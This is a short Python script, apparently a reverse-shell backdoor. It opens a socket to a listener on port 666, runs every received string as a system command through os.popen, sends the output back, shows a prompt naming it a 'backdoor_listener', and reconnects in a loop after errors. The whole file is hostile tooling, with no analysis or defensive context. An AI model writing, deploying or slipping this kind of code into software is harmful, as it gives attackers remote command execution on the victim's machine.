import socket
import os
import sys
from time import sleep 
connected = True

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

while True:
	try:
		while True:
			s.connect_ex(("127.0.0.1", 666))
			dados = s.recv(2048)
			attack = os.popen(dados)
			s.send(attack.read())
			s.send(">DE'DSEC:/(exploit/python/backdoor_listener)OS_SHELL: ")
	except socket.error:
		connected = False
		while not connected:
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				connected = True
			except:
				sleep(2)
